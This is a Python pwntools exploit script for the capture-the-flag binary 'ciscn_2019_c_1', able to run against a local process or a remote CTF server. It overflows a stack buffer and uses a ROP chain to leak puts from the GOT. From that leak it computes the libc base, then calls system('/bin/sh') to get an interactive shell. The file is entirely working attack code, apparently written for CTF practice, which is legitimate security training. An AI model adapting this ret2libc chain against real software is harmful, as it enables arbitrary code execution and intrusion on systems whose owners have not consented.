#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))
def debug():
    binaryname = 'ciscn_2019_c_1'
    interruptPoint=0
    pid = int(os.popen('pgrep {}'.format(binaryname)).readlines()[0])
    maps = os.popen('cat /proc/{}/maps'.format(pid))
    ELFbase = 0
    libcBase = 0
    for inf in maps.readlines():
        if ELFbase == 0:
            if binaryname in inf:
                ELFbase = int(inf.split('-', 1)[0], 16)
        if libcBase == 0:
            if 'libc' in inf:
                libcBase = int(inf.split('-', 1)[0], 16)
    success('elfbase', ELFbase)
    info('pid -> {}'.format(pid))
    if interruptPoint :
        success('interruptPoint', hex(interruptPoint+ELFbase))
    success('libcBase', libcBase)
    raw_input('debug>')

local = 2 
prdi = 0x0000000000400c83

if local == 1:
    io = process('./ciscn_2019_c_1')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elif local == 2:
    io = process('./ciscn_2019_c_1', env = {'LD_PRELOAD' : '../libc6_2.27-3ubuntu1_amd64.so'})
    libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')
else:
    io = remote('node2.buuoj.cn.wetolink.com', 28130)
    libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')

elf = ELF('./ciscn_2019_c_1')
padding = '\x00' * 0x50 + 'deadbeef'
payload = padding + p64(prdi) + p64(elf.got['puts'])
payload += p64(elf.plt['puts']) + p64(elf.sym['_start'])

# if local:
#     debug()
io.sendlineafter('choice!\n', '1')
io.sendlineafter('encrypted\n', payload)

io.recvuntil('Ciphertext\n')
io.recvline()
info('then is libc info')
putsaddr = u64(io.recvuntil('\n', drop = True).ljust(8, '\x00'))
success('putsaddr', putsaddr)
# putsaddr is 9c0
# getsaddr is 0b0
# search the version of libc
libcbase = putsaddr - libc.sym['puts']
success('libc base', libcbase)
libc.address = libcbase
sys = libc.sym['system']
binsh = libc.search('/bin/sh').next()
success('system', sys)
success('binsh', binsh)
if local:
    debug()
payload = padding + p64(prdi) + p64(binsh)
payload += p64(sys) + 'deadbeef' # little trick 0x1b

io.sendlineafter('choice!\n', '1')
io.sendlineafter('encrypted\n', payload)

io.interactive()
io.close()


